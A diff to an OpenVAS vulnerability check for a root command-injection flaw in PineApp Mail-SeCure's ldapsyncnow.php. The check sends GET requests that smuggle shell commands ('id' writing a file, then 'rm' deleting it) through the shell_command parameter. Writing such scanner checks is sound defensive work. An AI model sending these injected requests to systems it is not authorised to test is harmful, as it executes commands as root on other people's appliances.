@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_pineapp_mailsecure_61474.nasl 11865 2018-10-12 10:03:43Z cfischer $
+# $Id: gb_pineapp_mailsecure_61474.nasl 13994 2019-03-05 12:23:37Z cfischer $
 #
 # PineApp Mail-SeCure 'ldapsyncnow.php' Remote Command Injection Vulnerability
 #
@@ -25,11 +25,11 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103758");
   script_bugtraq_id(61474);
-  script_version("$Revision: 11865 $");
+  script_version("$Revision: 13994 $");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 
@@ -37,7 +37,7 @@ if (description)
 
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61474");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
   script_tag(name:"creation_date", value:"2013-08-13 11:34:56 +0200 (Tue, 13 Aug 2013)");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
@@ -47,16 +47,21 @@ if (description)
   script_exclude_keys("Settings/disable_cgi_scanning", "PineApp/missing");
 
   script_tag(name:"impact", value:"Successful exploits will result in the execution of arbitrary commands
- with root privileges in the context of the affected appliance.");
+  with root privileges in the context of the affected appliance.");
+
   script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check the response.");
+
   script_tag(name:"insight", value:"The specific flaw exists with input sanitization in the
- ldapsyncnow.php component. This flaw allows for the injection of arbitrary
- commands to the Mail-SeCure server. An attacker could leverage this
- vulnerability to execute arbitrary code as root.");
+  ldapsyncnow.php component. This flaw allows for the injection of arbitrary
+  commands to the Mail-SeCure server. An attacker could leverage this
+  vulnerability to execute arbitrary code as root.");
+
   script_tag(name:"solution", value:"Ask the Vendor for an update.");
+
   script_tag(name:"solution_type", value:"VendorFix");
+
   script_tag(name:"summary", value:"PineApp Mail-SeCure is prone to a remote command-injection
- vulnerability.");
+  vulnerability.");
 
   script_tag(name:"qod_type", value:"remote_app");
 
@@ -68,37 +73,33 @@ include("http_keepalive.inc");
 include("misc_func.inc");
 
 port = get_http_port(default:7443);
-
-if(!can_host_php(port:port)){
+if(!can_host_php(port:port))
   exit(0);
-}
 
 resp = http_get_cache(item:"/", port:port);
 
-if("PineApp" >!< resp) {
+if(! resp || "PineApp" >!< resp) {
   set_kb_item(name:"PineApp/missing", value:TRUE);
   exit(0);
 }
 
-vtstring = get_vt_string( lowercase:TRUE );
+vtstrings = get_vt_strings();
+file = vtstrings["lowercase_rand"] + '.txt';
 
-file = vtstring + '_' + rand() + '.txt';
-
-# create new file
-req = http_get(item:"/admin/ldapsyncnow.php?sync_now=1&shell_command=id>./" + file + ";", port:port);
+vuln_url = "/admin/ldapsyncnow.php?sync_now=1&shell_command=";
+req = http_get(item:vuln_url + "id>./" + file + ";", port:port);
 resp = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 
 req = http_get(item:"/admin/" + file, port:port);
 resp = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 
-# delete the created file
-req = http_get(item:"/admin/ldapsyncnow.php?sync_now=1&shell_command=rm%20./" + file + ";", port:port);
+req = http_get(item:vuln_url + "rm%20./" + file + ";", port:port);
 http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 
 if(resp =~ "uid=[0-9]+.*gid=[0-9]+.*") {
-  security_message(port:port);
+  report = report_vuln_url(port:port, url:vuln_url);
+  security_message(port:port, data:report);
   exit(0);
-
 }
 
 exit(99);
